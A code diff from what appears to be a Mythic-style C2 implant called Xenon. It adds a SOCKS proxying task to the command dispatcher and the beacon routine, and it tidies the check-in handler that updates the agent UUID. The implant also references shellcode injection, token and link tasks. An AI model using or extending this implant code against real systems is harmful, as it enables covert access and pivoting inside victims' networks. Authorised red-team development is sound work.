@@ -12,12 +12,13 @@
 #include "Tasks/Upload.h"
 #include "Tasks/InlineExecute.h"
 #include "Tasks/InjectShellcode.h"
+#include "Tasks/Socks.h"
 #include "Tasks/Token.h"
 #include "Tasks/Link.h"
 #include "Tasks/Exit.h"
 
 /**
- * @brief @brief Process commands from GET_TASKING
+ * @brief Process commands from GET_TASKING
 
  * @param [in] cmd Task command ID.
  * @param [in] taskUuid Mythic's UUID for tracking tasks.
@@ -220,6 +221,20 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
             return;
         }
 #endif
+#ifdef INCLUDE_CMD_SOCKS
+        case SOCKS_CMD:
+        {
+            _dbg("SOCKS_CMD was called");
+            Socks(taskUuid, taskParser);
+            return;
+        }
+        case SOCKS_RESP:
+        {
+            _dbg("SOCKS_RESP was called");
+            SocksProcessData(taskParser);
+            return;
+        }
+#endif
 #ifdef INCLUDE_CMD_LINK
         case LINK_CMD:
         {
@@ -247,46 +262,33 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
 
 /**
  * @brief Process the checkin response from the server
- * @param [in] checkinResponseData PPARSER struct containing the checkin response
+ * @param [in] parser PPARSER struct containing the checkin response
  * @return BOOL success or not
  */
-BOOL TaskCheckin(PPARSER checkinResponseData)
+BOOL TaskCheckin(PPARSER parser)
 {   
-    if (checkinResponseData == NULL)
+    if ( parser == NULL )
     {
         _err("Checkin data cannot be null.");
         return FALSE;
     }
-
-    BOOL bStatus = FALSE;
     
-    BYTE checkinByte = ParserGetByte(checkinResponseData);
-    if (checkinByte != CHECKIN)
+    BYTE checkinByte = ParserGetByte(parser);
+    if ( checkinByte != CHECKIN )
     {
         _err("CHECKIN byte 0x%x != 0xF1", checkinByte);
-        goto end;
+        return FALSE;
     }
 
     // Mythic sends a new UUID after the checkin, we need to update it
     SIZE_T sizeUuid = TASK_UUID_SIZE;
-    PCHAR tempUUID = ParserGetString(checkinResponseData, &sizeUuid);           // ToDo use ParserStringCopy
+    PCHAR  newUuid  = ParserStringCopy(parser, &sizeUuid);               // allocates 
 
-    // Allocate memory for newUUID and copy the UUID string
-    PCHAR newUUID = (PCHAR)malloc(sizeUuid + 1);  // +1 for the null terminator
-    if (newUUID == NULL) {
-        goto end;
-    }
-    memcpy(newUUID, tempUUID, sizeUuid);  // Copy UUID bytes
-    newUUID[sizeUuid] = '\0';             // Null-terminate the string
+    _dbg("[CHECKIN] Setting new Agent UUID -> %s", newUuid);
 
-    _dbg("[CHECKIN] Setting new Agent UUID -> %s", newUUID);
+    XenonUpdateUuid(newUuid);
 
-    XenonUpdateUuid(newUUID);
-
-    bStatus = TRUE;
-
-end:
-    return bStatus;
+    return TRUE;
 }
 
 
@@ -333,7 +335,6 @@ VOID TaskProcess(PPARSER tasks)
         
         ParserNew(&taskParser, taskBuffer, sizeTask);
         
-        // Do the tasks synchronously 
         TaskDispatch(taskId, taskUuid, &taskParser);
 
         ParserDestroy(&taskParser);
@@ -429,6 +430,13 @@ VOID TaskRoutine()
 #if defined(INCLUDE_CMD_DOWNLOAD)
 
     DownloadPush();
+
+#endif
+
+    /* Push SOCKS data to Server */
+#if defined(INCLUDE_CMD_SOCKS)
+
+    SocksPush();
 
 #endif
 
